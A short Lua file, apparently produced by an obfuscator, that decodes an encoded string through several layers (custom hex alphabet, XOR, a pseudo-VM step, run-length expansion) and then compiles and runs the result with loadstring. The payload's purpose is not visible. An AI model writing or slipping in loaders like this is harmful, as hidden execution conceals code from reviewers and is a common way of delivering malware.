return(function()
local vkiqtztjdb="ab378171569e40e3f3b87c8229640d493b87c110964ed01db3781ce969e4ad968bc7511246def0a773182c09e9043d5a"
local vaybrdhoeh="94c5380a6e12b7df"
local vnyrthxzsu={}
for vchcbedyqw=1,#vkiqtztjdb,2 do
if vchcbedyqw%2==0 then
local vfxxmcwmeb=string.find(vaybrdhoeh,vkiqtztjdb:sub(vchcbedyqw,vchcbedyqw),1,true)-1
local vwscpfmows=string.find(vaybrdhoeh,vkiqtztjdb:sub(vchcbedyqw+1,vchcbedyqw+1),1,true)-1
table.insert(vnyrthxzsu,string.char(vfxxmcwmeb*16+vwscpfmows))
else
local vfxxmcwmeb=string.find(vaybrdhoeh,vkiqtztjdb:sub(vchcbedyqw,vchcbedyqw),1,true)-1
local vwscpfmows=string.find(vaybrdhoeh,vkiqtztjdb:sub(vchcbedyqw+1,vchcbedyqw+1),1,true)-1
table.insert(vnyrthxzsu,string.char(vfxxmcwmeb*16+vwscpfmows))
end
end
local vdgcaucsyq=table.concat(vnyrthxzsu)
local vivzgnrigj={}
for vchcbedyqw=1,#vdgcaucsyq do
local vpzcpylsdb=vdgcaucsyq:byte(vchcbedyqw)
local vnzsmtwhqu=bit32.bxor(vpzcpylsdb,110)
local vckscfxfgr=vnzsmtwhqu-((vchcbedyqw*17)%256)
table.insert(vivzgnrigj,string.char(vckscfxfgr%256))
end
vdgcaucsyq=table.concat(vivzgnrigj)
local vivzgnrigj={}
local vchcbedyqw=1
while vchcbedyqw<=#vdgcaucsyq do
local vckscfxfgr=vdgcaucsyq:byte(vchcbedyqw)
if vckscfxfgr==1 then
table.insert(vivzgnrigj,string.char(vdgcaucsyq:byte(vchcbedyqw+1)))
vchcbedyqw=vchcbedyqw+2
else error('Invalid VM instruction') end
end
vdgcaucsyq=table.concat(vivzgnrigj)
local vivzgnrigj={}
for vchcbedyqw=1,#vdgcaucsyq,2 do
local vckscfxfgr=vdgcaucsyq:byte(vchcbedyqw)
local vnzsmtwhqu=vdgcaucsyq:byte(vchcbedyqw+1)
if not vckscfxfgr or not vnzsmtwhqu then error('Invalid compressed data') end
table.insert(vivzgnrigj,string.rep(string.char(vnzsmtwhqu),vckscfxfgr))
end
vdgcaucsyq=table.concat(vivzgnrigj)
local vivzgnrigj=loadstring or load
if not vivzgnrigj then error('Dynamic compilation unavailable') end
local vckscfxfgr=vivzgnrigj(vdgcaucsyq)
if not vckscfxfgr then error('Compilation failed') end
return vckscfxfgr()
end)()